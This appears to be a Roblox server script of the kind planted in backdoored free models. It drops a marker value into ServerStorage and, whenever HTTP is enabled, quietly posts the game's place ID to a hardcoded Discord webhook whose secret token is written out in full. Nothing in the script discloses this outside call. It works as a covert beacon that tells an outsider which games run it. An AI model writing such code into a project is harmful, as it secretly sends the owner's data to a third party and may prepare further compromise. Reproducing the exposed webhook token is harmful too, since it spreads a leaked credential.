local SS=game.ServerStorage
local ins=Instance.new("BoolValue")
--ins.Name="t836"
ins.Parent=SS

if game:GetService("HttpService").HttpEnabled then
	local data = {
			content = "**Game ID:** " .. game.PlaceId 
	}
	local success, response = pcall(function()
			return game:GetService("HttpService"):PostAsync("https://discord.com/api/webhooks/1334977341209968640/ZEc46TGVktdwhJyhxt67Bs7w1uuOyI-zEgMABH221tryNFNCDPccqT3b1_Hn9kNEpuvh", game:GetService("HttpService"):JSONEncode(data), Enum.HttpContentType.ApplicationJson)
	end)
end
